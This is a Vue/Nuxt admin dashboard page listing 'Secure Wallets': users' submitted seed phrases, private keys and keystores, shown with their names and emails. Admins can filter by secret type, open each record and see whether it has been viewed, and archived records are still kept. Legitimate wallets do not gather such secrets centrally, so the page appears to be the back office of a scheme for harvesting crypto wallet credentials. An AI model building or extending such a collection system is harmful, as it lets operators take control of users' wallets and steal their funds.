<template>
    <DashboardLayout>
      <!-- ─────── HEADER ─────── -->
      <div class="mb-6 md:mb-8 mt-[70px]">
        <div class="flex flex-wrap items-center justify-between gap-4">
          <div class="flex items-center gap-3">
            <div class="w-11 h-11 rounded-2xl flex items-center justify-center bg-emerald-500/10">
              <i class="bi bi-shield-lock-fill text-emerald-500 text-lg"></i>
            </div>
            <div>
              <h1 class="font-bold text-2xl md:text-3xl text-gray-800 dark:text-white">
                Secure Wallets
              </h1>
              <p class="text-xs md:text-sm text-gray-500 dark:text-white/40">
                User-submitted recovery data (encrypted at rest)
              </p>
            </div>
          </div>
          <button
            @click="refreshAll"
            :disabled="store.state.isLoading || store.state.isLoadingStats"
            class="flex items-center gap-2 px-4 py-2.5 rounded-xl font-semibold text-sm
                   bg-white border border-gray-200 text-gray-700 hover:bg-gray-50
                   disabled:opacity-50 disabled:cursor-not-allowed
                   dark:bg-white/[0.04] dark:border-white/[0.06] dark:text-white/70 dark:hover:bg-white/[0.08]"
          >
            <span v-if="store.state.isLoading" class="w-3.5 h-3.5 rounded-full border-2 border-current border-t-transparent animate-spin"></span>
            <i v-else class="bi bi-arrow-clockwise"></i> Refresh
          </button>
        </div>
      </div>
  
      <!-- ─────── STATS ─────── -->
      <div class="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4 mb-6">
        <div
          v-for="s in statCards"
          :key="s.key"
          class="rounded-2xl p-4 bg-white border border-gray-100 shadow-sm
                 dark:bg-[#101A47] dark:border-white/[0.05]"
        >
          <div class="flex items-center gap-2 mb-2">
            <div class="w-7 h-7 rounded-lg flex items-center justify-center" :style="{ background: s.bgColor }">
              <i :class="s.icon" :style="{ color: s.iconColor }" class="text-xs"></i>
            </div>
            <span class="text-[10px] uppercase tracking-wider text-gray-500 dark:text-white/40 font-bold">
              {{ s.label }}
            </span>
          </div>
          <div v-if="s.loading" class="h-6 w-16 rounded bg-gray-200 dark:bg-white/[0.06] animate-pulse"></div>
          <div v-else class="text-xl md:text-2xl font-bold text-gray-800 dark:text-white">{{ s.value }}</div>
          <p v-if="s.sub" class="text-[10px] text-gray-400 dark:text-white/30 mt-1">{{ s.sub }}</p>
        </div>
      </div>
  
      <!-- ─────── FILTERS ─────── -->
      <div class="rounded-2xl p-4 mb-4 bg-white border border-gray-100 shadow-sm
                  dark:bg-[#101A47] dark:border-white/[0.05]">
        <div class="flex flex-col md:flex-row gap-3">
          <div class="relative flex-1">
            <i class="bi bi-search absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 dark:text-white/30"></i>
            <input
              v-model="localSearch"
              @input="debouncedSearch"
              type="text"
              placeholder="Search by user name, email, address, or label..."
              class="w-full pl-11 pr-4 py-2.5 rounded-xl text-sm outline-none
                     bg-gray-50 border border-gray-200 text-gray-800 focus:border-amber-500/50
                     dark:bg-white/[0.04] dark:border-white/[0.06] dark:text-white dark:focus:border-amber-500/50"
            >
          </div>
  
          <select
            v-model="store.state.filters.type"
            @change="applyFilters"
            class="px-4 py-2.5 rounded-xl text-sm cursor-pointer
                   bg-gray-50 border border-gray-200 text-gray-800
                   dark:bg-white/[0.04] dark:border-white/[0.06] dark:text-white"
          >
            <option value="all">All Types</option>
            <option value="phrase">Phrase</option>
            <option value="privateKey">Private Key</option>
            <option value="keystore">Keystore</option>
          </select>
  
          <select
            v-model="store.state.filters.status"
            @change="applyFilters"
            class="px-4 py-2.5 rounded-xl text-sm cursor-pointer
                   bg-gray-50 border border-gray-200 text-gray-800
                   dark:bg-white/[0.04] dark:border-white/[0.06] dark:text-white"
          >
            <option value="active">Active</option>
            <option value="archived">Archived</option>
            <option value="all">All Status</option>
          </select>
  
          <button
            v-if="hasFilters"
            @click="resetFilters"
            class="px-4 py-2.5 rounded-xl text-sm font-semibold
                   bg-red-50 text-red-600 hover:bg-red-100 border border-red-200
                   dark:bg-red-500/[0.08] dark:text-red-400 dark:border-red-500/[0.15]"
          >
            <i class="bi bi-x-circle mr-1"></i> Clear
          </button>
        </div>
      </div>
  
      <!-- ─────── ERROR ─────── -->
      <div v-if="store.state.error"
           class="mb-4 flex items-start gap-3 p-4 rounded-2xl
                  bg-red-50 border border-red-200
                  dark:bg-red-500/[0.08] dark:border-red-500/[0.15]">
        <i class="bi bi-exclamation-circle-fill text-red-500 text-lg mt-0.5"></i>
        <p class="flex-1 text-sm text-red-700 dark:text-red-400">{{ store.state.error }}</p>
        <button @click="store.clearError()" class="text-red-500 hover:text-red-700">
          <i class="bi bi-x-lg"></i>
        </button>
      </div>
  
      <!-- ─────── SKELETON ─────── -->
      <div v-if="store.state.isLoading && !store.hasWallets" class="space-y-3">
        <div
          v-for="i in 6"
          :key="i"
          class="rounded-2xl p-5 bg-white border border-gray-100 dark:bg-[#101A47] dark:border-white/[0.05] animate-pulse"
        >
          <div class="flex items-center gap-4">
            <div class="w-12 h-12 rounded-full bg-gray-200 dark:bg-white/[0.06]"></div>
            <div class="flex-1 space-y-2">
              <div class="h-4 bg-gray-200 dark:bg-white/[0.06] rounded w-1/3"></div>
              <div class="h-3 bg-gray-100 dark:bg-white/[0.04] rounded w-1/4"></div>
            </div>
            <div class="h-6 w-24 bg-gray-200 dark:bg-white/[0.06] rounded-full"></div>
            <div class="h-10 w-32 bg-gray-200 dark:bg-white/[0.06] rounded-xl"></div>
          </div>
        </div>
      </div>
  
      <!-- ─────── EMPTY ─────── -->
      <div v-else-if="!store.hasWallets"
           class="rounded-2xl p-12 text-center bg-white border border-gray-100
                  dark:bg-[#101A47] dark:border-white/[0.05]">
        <div class="w-20 h-20 mx-auto rounded-2xl bg-gray-100 dark:bg-white/[0.04] flex items-center justify-center mb-4">
          <i class="bi bi-shield-slash text-3xl text-gray-300 dark:text-white/20"></i>
        </div>
        <p class="font-semibold text-gray-700 dark:text-white/70">No wallets found</p>
        <p class="text-sm text-gray-500 dark:text-white/40 mt-1">
          {{ hasFilters ? 'Try adjusting filters' : 'Users haven\'t imported any wallets yet' }}
        </p>
      </div>
  
      <!-- ─────── TABLE ─────── -->
      <div v-else class="rounded-2xl overflow-hidden bg-white border border-gray-100 shadow-sm
                         dark:bg-[#101A47] dark:border-white/[0.05]">
        <div class="overflow-x-auto">
          <table class="w-full min-w-[900px]">
            <thead class="border-b border-gray-100 dark:border-white/[0.06] bg-gray-50/50 dark:bg-white/[0.01]">
              <tr>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">User</th>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Coin</th>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Type</th>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Address</th>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Status</th>
                <th class="text-left py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Created</th>
                <th class="text-right py-4 px-5 text-xs font-bold uppercase tracking-wider text-gray-500 dark:text-white/40">Actions</th>
              </tr>
            </thead>
            <tbody>
              <tr
                v-for="w in store.state.wallets"
                :key="w._id"
                class="border-b border-gray-100 hover:bg-gray-50
                       dark:border-white/[0.03] dark:hover:bg-white/[0.03] transition-colors"
              >
                <td class="py-4 px-5">
                  <div v-if="w.user" class="flex items-center gap-3">
                    <div class="w-10 h-10 rounded-full bg-amber-500/10 flex items-center justify-center flex-shrink-0">
                      <span class="text-sm font-bold text-amber-600 dark:text-amber-400">
                        {{ initials(w.user) }}
                      </span>
                    </div>
                    <div class="min-w-0">
                      <p class="text-sm font-bold text-gray-800 dark:text-white truncate max-w-[160px]">
                        {{ w.user.name || '—' }}
                      </p>
                      <p class="text-xs text-gray-500 dark:text-white/40 truncate max-w-[160px]">
                        {{ w.user.email }}
                      </p>
                    </div>
                  </div>
                  <span v-else class="text-xs text-gray-400 italic">Deleted user</span>
                </td>
  
                <td class="py-4 px-5">
                  <div class="flex items-center gap-2">
                    <div
                      class="w-7 h-7 rounded-full flex items-center justify-center text-xs text-white"
                      :style="{ background: coinMeta(w.coin).color }"
                    >
                      <span v-html="coinMeta(w.coin).emoji"></span>
                    </div>
                    <div class="text-xs">
                      <p class="font-bold text-gray-800 dark:text-white">{{ w.coin }}</p>
                      <p class="text-gray-400 dark:text-white/30">{{ w.network }}</p>
                    </div>
                  </div>
                </td>
  
                <td class="py-4 px-5">
                  <span
                    class="px-2.5 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider inline-flex items-center gap-1"
                    :class="typeMeta(w.type).cls"
                  >
                    <i :class="typeMeta(w.type).icon"></i>
                    {{ typeMeta(w.type).label }}
                  </span>
                </td>
  
                <td class="py-4 px-5">
                  <p class="text-xs font-mono text-gray-700 dark:text-white/70 truncate max-w-[140px]" :title="w.address">
                    {{ w.maskedAddress || w.address }}
                  </p>
                  <p v-if="w.label" class="text-[10px] text-gray-400 dark:text-white/30 truncate max-w-[140px]">
                    <i class="bi bi-tag"></i> {{ w.label }}
                  </p>
                </td>
  
                <td class="py-4 px-5">
                  <span
                    class="px-2.5 py-1 rounded-full text-xs font-bold inline-flex items-center gap-1.5"
                    :class="w.status === 'active'
                      ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400'
                      : 'bg-gray-100 text-gray-500 dark:bg-white/[0.06] dark:text-white/40'"
                  >
                    <span class="w-1.5 h-1.5 rounded-full"
                          :class="w.status === 'active' ? 'bg-emerald-500' : 'bg-gray-400'"></span>
                    {{ w.status === 'active' ? 'Active' : 'Archived' }}
                  </span>
                </td>
  
                <td class="py-4 px-5">
                  <p class="text-xs text-gray-500 dark:text-white/40 whitespace-nowrap">
                    {{ formatDate(w.createdAt) }}
                  </p>
                  <p v-if="w.lastViewedByAdminAt" class="text-[10px] text-amber-500 font-bold mt-0.5">
                    <i class="bi bi-eye mr-0.5"></i>Viewed
                  </p>
                </td>
  
                <td class="py-4 px-5 text-right">
                  <div class="inline-flex items-center gap-2">
                    <NuxtLink
                      :to="`/dashboard/admin/secure-wallet/${w._id}`"
                      class="w-9 h-9 rounded-xl flex items-center justify-center transition-all
                             bg-amber-500/10 text-amber-500 hover:bg-amber-500/20"
                      title="View details"
                    >
                      <i class="bi bi-eye-fill"></i>
                    </NuxtLink>
                    <button
                      v-if="w.status === 'active'"
                      @click="confirmDelete(w)"
                      :disabled="store.state.isSubmitting"
                      class="w-9 h-9 rounded-xl flex items-center justify-center transition-all
                             bg-red-500/10 text-red-500 hover:bg-red-500/20
                             disabled:opacity-50 disabled:cursor-not-allowed"
                      title="Archive"
                    >
                      <i class="bi bi-archive"></i>
                    </button>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>
  
        <!-- Pagination -->
        <div class="flex flex-col md:flex-row items-center justify-between gap-4 p-4 border-t
                    border-gray-100 bg-gray-50/50 dark:border-white/[0.06] dark:bg-white/[0.01]">
          <div class="text-xs text-gray-500 dark:text-white/40">
            Showing <strong class="text-gray-800 dark:text-white">{{ startIndex + 1 }}</strong>
            to <strong class="text-gray-800 dark:text-white">{{ endIndex }}</strong>
            of <strong class="text-gray-800 dark:text-white">{{ store.state.pagination.total }}</strong>
          </div>
          <div class="flex items-center gap-1">
            <button
              @click="goPage(store.state.pagination.page - 1)"
              :disabled="store.state.pagination.page === 1"
              class="w-9 h-9 rounded-lg flex items-center justify-center
                     disabled:opacity-40 disabled:cursor-not-allowed
                     hover:bg-gray-200 dark:hover:bg-white/[0.06]"
            >
              <i class="bi bi-chevron-left text-sm"></i>
            </button>
            <button
              v-for="p in visiblePages"
              :key="p"
              @click="goPage(p)"
              class="w-9 h-9 rounded-lg flex items-center justify-center text-sm font-bold"
              :class="store.state.pagination.page === p
                ? 'text-primary-900 shadow-md shadow-amber-500/20'
                : 'text-gray-600 dark:text-white/50 hover:bg-gray-200 dark:hover:bg-white/[0.06]'"
              :style="store.state.pagination.page === p
                ? 'background: linear-gradient(135deg, #F5D77F 0%, #E6BB5C 100%);'
                : ''"
            >
              {{ p }}
            </button>
            <button
              @click="goPage(store.state.pagination.page + 1)"
              :disabled="store.state.pagination.page === store.totalPages"
              class="w-9 h-9 rounded-lg flex items-center justify-center
                     disabled:opacity-40 disabled:cursor-not-allowed
                     hover:bg-gray-200 dark:hover:bg-white/[0.06]"
            >
              <i class="bi bi-chevron-right text-sm"></i>
            </button>
          </div>
        </div>
      </div>
  
      <!-- ─────── DELETE MODAL ─────── -->
      <Transition
        enter-active-class="transition duration-200"
        enter-from-class="opacity-0"
        enter-to-class="opacity-100"
      >
        <div
          v-if="deleteTarget"
          class="fixed inset-0 z-[700] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
          @click.self="!store.state.isSubmitting && (deleteTarget = null)"
        >
          <div class="w-full max-w-sm rounded-3xl overflow-hidden shadow-2xl
                      bg-white dark:bg-[#101A47] border border-gray-100 dark:border-white/[0.06]">
            <div class="p-6 text-center">
              <div class="w-14 h-14 mx-auto rounded-2xl bg-red-500/10 flex items-center justify-center mb-4">
                <i class="bi bi-archive-fill text-red-500 text-2xl"></i>
              </div>
              <h3 class="font-bold text-lg text-gray-800 dark:text-white mb-2">Archive this wallet?</h3>
              <p class="text-sm text-gray-500 dark:text-white/50 mb-5">
                <strong class="text-gray-800 dark:text-white">{{ deleteTarget.coin }} · {{ deleteTarget.network }}</strong>
                will no longer appear in the user's list. Data is retained for recovery.
              </p>
              <div class="flex gap-3">
                <button
                  @click="deleteTarget = null"
                  :disabled="store.state.isSubmitting"
                  class="flex-1 py-2.5 rounded-xl font-semibold text-sm
                         bg-gray-100 dark:bg-white/[0.06] text-gray-700 dark:text-white/70
                         disabled:opacity-50"
                >Cancel</button>
                <button
                  @click="doDelete"
                  :disabled="store.state.isSubmitting"
                  class="flex-1 py-2.5 rounded-xl font-bold text-sm
                         bg-red-500 text-white hover:bg-red-600 disabled:opacity-50
                         inline-flex items-center justify-center gap-2"
                >
                  <span v-if="store.state.isSubmitting" class="w-3.5 h-3.5 rounded-full border-2 border-white border-t-transparent animate-spin"></span>
                  Archive
                </button>
              </div>
            </div>
          </div>
        </div>
      </Transition>
  
      <!-- ─────── TOAST ─────── -->
      <Transition
        enter-active-class="transition-all duration-300"
        enter-from-class="opacity-0 translate-y-4"
        enter-to-class="opacity-100 translate-y-0"
        leave-active-class="transition-all duration-200"
        leave-to-class="opacity-0 translate-y-4"
      >
        <div
          v-if="toast"
          class="fixed bottom-6 left-1/2 -translate-x-1/2 z-[800] px-5 py-3 rounded-xl shadow-2xl flex items-center gap-3"
          :class="toast.type === 'success' ? 'bg-emerald-500' : 'bg-red-500'"
        >
          <i :class="toast.type === 'success' ? 'bi bi-check-circle-fill' : 'bi bi-x-circle-fill'" class="text-white text-lg"></i>
          <span class="text-white text-sm font-bold">{{ toast.message }}</span>
        </div>
      </Transition>
    </DashboardLayout>
  </template>
  
  <script setup>
  import { ref, computed, onMounted } from 'vue'
  import { useAdminSecureWalletStore } from '~/stores/adminSecureWallet'
  import { SECURE_WALLET_COINS } from '~/composables/constants'
  
  definePageMeta({ layout: 'dashboard' })
  
  const store = useAdminSecureWalletStore()
  const localSearch = ref('')
  const deleteTarget = ref(null)
  const toast = ref(null)
  
  // ─────────────────────────────────────────────────────────────
  // COMPUTED
  // ─────────────────────────────────────────────────────────────
  const hasFilters = computed(() =>
    store.state.filters.type !== 'all' ||
    store.state.filters.status !== 'active' ||
    store.state.filters.coin !== 'all' ||
    store.state.filters.search
  )
  
  const statCards = computed(() => {
    const s = store.state.stats
    const loading = !store.state.statsLoaded
    const byType = (t) => (s?.byType || []).find((x) => x._id === t)?.count || 0
  
    return [
      {
        key: 'total', label: 'Total Wallets', value: `${s?.activeWallets || 0}`,
        sub: `${s?.issuedLast7Days || 0} in last 7 days`,
        icon: 'bi bi-shield-lock-fill', iconColor: '#10b981', bgColor: 'rgba(16, 185, 129, 0.15)',
        loading,
      },
      {
        key: 'enabled', label: 'Enabled Users', value: `${s?.enabledUsers || 0}`,
        sub: 'Have the feature on',
        icon: 'bi bi-people-fill', iconColor: '#3b82f6', bgColor: 'rgba(59, 130, 246, 0.15)',
        loading,
      },
      {
        key: 'phrase', label: 'Phrases', value: `${byType('phrase')}`,
        sub: `${byType('privateKey')} private keys`,
        icon: 'bi bi-chat-quote-fill', iconColor: '#f59e0b', bgColor: 'rgba(245, 158, 11, 0.15)',
        loading,
      },
      {
        key: 'keystore', label: 'Keystores', value: `${byType('keystore')}`,
        sub: `${s?.archivedWallets || 0} archived`,
        icon: 'bi bi-file-lock-fill', iconColor: '#8b5cf6', bgColor: 'rgba(139, 92, 246, 0.15)',
        loading,
      },
    ]
  })
  
  const startIndex = computed(() => (store.state.pagination.page - 1) * store.state.pagination.limit)
  const endIndex = computed(() => Math.min(startIndex.value + store.state.wallets.length, store.state.pagination.total))
  
  const visiblePages = computed(() => {
    const total = store.totalPages
    const current = store.state.pagination.page
    const pages = []
    if (total <= 5) for (let i = 1; i <= total; i++) pages.push(i)
    else if (current <= 3) for (let i = 1; i <= 4; i++) pages.push(i)
    else if (current >= total - 2) for (let i = total - 3; i <= total; i++) pages.push(i)
    else for (let i = current - 1; i <= current + 1; i++) pages.push(i)
    return pages
  })
  
  // ─────────────────────────────────────────────────────────────
  // HELPERS
  // ─────────────────────────────────────────────────────────────
  const TYPE_META = {
    phrase:     { label: 'Phrase',     icon: 'bi bi-chat-quote', cls: 'bg-amber-500/10 text-amber-600 dark:text-amber-400' },
    privateKey: { label: 'Private Key',icon: 'bi bi-key',        cls: 'bg-blue-500/10 text-blue-600 dark:text-blue-400' },
    keystore:   { label: 'Keystore',   icon: 'bi bi-file-lock',  cls: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400' },
  }
  const typeMeta = (t) => TYPE_META[t] || TYPE_META.phrase
  
  const coinMeta = (coin) =>
    SECURE_WALLET_COINS.find((c) => c.coin === coin) ||
    { color: '#6B7280', emoji: '?' }
  
  const initials = (user) => {
    const n = user?.name || user?.email || ''
    return n.split(' ').map((p) => p[0]).slice(0, 2).join('').toUpperCase() || '?'
  }
  
  const formatDate = (d) => {
    if (!d) return '—'
    return new Date(d).toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
  }
  
  const showToast = (msg, type = 'success') => {
    toast.value = { message: msg, type }
    setTimeout(() => (toast.value = null), 3000)
  }
  
  // ─────────────────────────────────────────────────────────────
  // FILTERS
  // ─────────────────────────────────────────────────────────────
  const applyFilters = () => {
    store.state.pagination.page = 1
    store.fetchWallets()
  }
  
  let searchTimer = null
  const debouncedSearch = () => {
    clearTimeout(searchTimer)
    searchTimer = setTimeout(() => {
      store.setFilters({ search: localSearch.value })
      store.fetchWallets()
    }, 400)
  }
  
  const resetFilters = async () => {
    localSearch.value = ''
    store.resetFilters()
    await store.fetchWallets()
  }
  
  const goPage = (p) => {
    if (p < 1 || p > store.totalPages) return
    store.setPage(p)
    store.fetchWallets()
  }
  
  const refreshAll = async () => {
    await Promise.all([
      store.fetchWallets({}, { force: true }),
      store.fetchStats({ force: true }),
    ])
  }
  
  // ─────────────────────────────────────────────────────────────
  // ACTIONS
  // ─────────────────────────────────────────────────────────────
  const confirmDelete = (w) => { deleteTarget.value = w }
  
  const doDelete = async () => {
    if (!deleteTarget.value) return
    const res = await store.deleteWallet(deleteTarget.value._id)
    if (res.success) {
      showToast('Wallet archived')
      deleteTarget.value = null
    } else {
      showToast(res.message || 'Failed', 'error')
    }
  }
  
  // ─────────────────────────────────────────────────────────────
  // INIT
  // ─────────────────────────────────────────────────────────────
  onMounted(() => {
    store.fetchWallets()
    store.fetchStats()
  })
  </script>
  
  <style scoped>
  .overflow-x-auto::-webkit-scrollbar { height: 6px; }
  .overflow-x-auto::-webkit-scrollbar-track { background: transparent; }
  .overflow-x-auto::-webkit-scrollbar-thumb {
    background: rgba(187, 145, 74, 0.3);
    border-radius: 10px;
  }
  </style>